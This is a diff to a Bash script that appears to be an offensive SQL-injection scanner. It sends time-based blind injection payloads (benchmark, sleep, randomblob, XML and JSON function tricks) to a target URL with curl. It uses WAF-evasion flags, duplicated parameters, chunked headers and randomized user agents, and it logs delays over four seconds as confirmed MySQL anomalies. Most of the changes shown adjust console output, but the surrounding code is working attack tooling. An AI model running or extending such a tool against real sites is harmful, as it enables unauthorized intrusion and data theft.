@@ -187,35 +187,35 @@ local active_payload=""
           else
      active_payload="$defiance_tamper_path"
           fi
-      local output_text=""
-      if [[ "$payloadsi" = "true" ]]; then
-      output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [POST][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Payload: ${active_payload}]\033[0m\n"
+local current_method="${REQ_METHOD:-POST}"
+
+if [[ "$payloadsi" = "true" ]]; then
+  output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Len: ${#active_payload}b]\033[0m\n"
 else 
-local technique_name="Generic Time-Based"
-
-case "${active_payload}" in
-  *"benchmark"*)
-    technique_name="Time-Based (Heavy Benchmark)"
-    ;;
-  *"randomblob"*)
-    technique_name="Time-Based (CPU-Exhaustion Blob)"
-    ;;
-  *"extractvalue"*|*"updatesxml"*)
-    technique_name="Time-Based (XML Function Nested)"
-    ;;
-  *"json_keys"*)
-    technique_name="Time-Based (JSON Object Nested)"
-    ;;
-  *"sleep"*)
-    technique_name="Time-Based (Sub-Query Sleep)"
-    ;;
-esac
-  output_text="[\033[34m${current_time}\033[0m] [\033[34mINFO\033[0m] Attempting ${technique_name} injection technique (Vector 1 & 2)."
+  local technique_name="Generic Time-Based"
+  case "${active_payload}" in
+    *"benchmark"*)
+      technique_name="Time-Based (Heavy Benchmark)"
+      ;;
+    *"randomblob"*)
+      technique_name="Time-Based (CPU-Exhaustion Blob)"
+      ;;
+    *"extractvalue"*|*"updatesxml"*)
+      technique_name="Time-Based (XML Function Nested)"
+      ;;
+    *"json_keys"*)
+      technique_name="Time-Based (JSON Object Nested)"
+      ;;
+    *"sleep"*)
+      technique_name="Time-Based (Sub-Query Sleep)"
+      ;;
+  esac
+  output_text="[\033[34m${current_time}\033[0m] [i] Attempting ${technique_name} injection technique (Vector 1 & 2)."
 fi
-          if [ "$REQ_METHOD" = "POST" ]; then
-          
-          echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [POST][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Payload: ${active_payload}]\033[0m\n"
 
+echo -e "$output_text"
+
+          if [ "$REQ_METHOD" = "POST" ]; then
           curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
             curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
@@ -223,9 +223,6 @@ fi
             -w "%{time_total}|%{http_code}" \
             "${target_url}${default_path}")
         else
-
-          echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [GET][Port:$random_port] Probing: \033[38;5;238m${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}\033[0m\n"
-          
           curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
             -m 12 -A "$random_ua" -s -o /dev/null \
@@ -318,10 +315,35 @@ local current_time=$(date +%H:%M:%S)
           else
      active_payload="$defiance_tamper_path"
           fi
-          if [ "$REQ_METHOD" = "POST" ]; then
-            
-            echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m>\e[0m] Vector 2 [POST][PORT:$random_port] Param: $TARGET_PARAM  \033[38;5;238m[Payload: ${active_payload}]\033[0m\n"
+local current_method="${REQ_METHOD:-POST}"
 
+if [[ "$payloadsi" = "true" ]]; then
+  output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Len: ${#active_payload}b]\033[0m\n"
+else 
+  local technique_name="Generic Time-Based"
+  case "${active_payload}" in
+    *"benchmark"*)
+      technique_name="Time-Based (Heavy Benchmark)"
+      ;;
+    *"randomblob"*)
+      technique_name="Time-Based (CPU-Exhaustion Blob)"
+      ;;
+    *"extractvalue"*|*"updatesxml"*)
+      technique_name="Time-Based (XML Function Nested)"
+      ;;
+    *"json_keys"*)
+      technique_name="Time-Based (JSON Object Nested)"
+      ;;
+    *"sleep"*)
+      technique_name="Time-Based (Sub-Query Sleep)"
+      ;;
+  esac
+  output_text="[\033[34m${current_time}\033[0m] [i] Attempting ${technique_name} injection technique (Vector 1 & 2).\n"
+fi
+
+echo -e "$output_text"
+
+          if [ "$REQ_METHOD" = "POST" ]; then        
             curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
               curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
@@ -329,9 +351,6 @@ local current_time=$(date +%H:%M:%S)
               -w "%{time_total}|%{http_code}" \
               "${target_url}${default_path}")
           else
-
-            echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m>\e[0m] Vector 2 [GET][Port:$random_port] Probing: \033[38;5;238m${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}\033[0m\n"
-
             curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
             -m 12 -A "$random_ua" -s -o /dev/null \
@@ -349,7 +368,7 @@ local current_time=$(date +%H:%M:%S)
 
             if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
               if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-                echo -e "[\033[34m${current_time}\033[0m] [\033[2;34m×\033[0m]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
+                echo -e "[\033[34m${current_time}\033[0m] [\033[2;34m×\033[0m]\e[0m \033[1mVector 2 confirmed MySQL Anomaly: ${stopwatch}s\033[0m"
                 echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
               fi
             fi
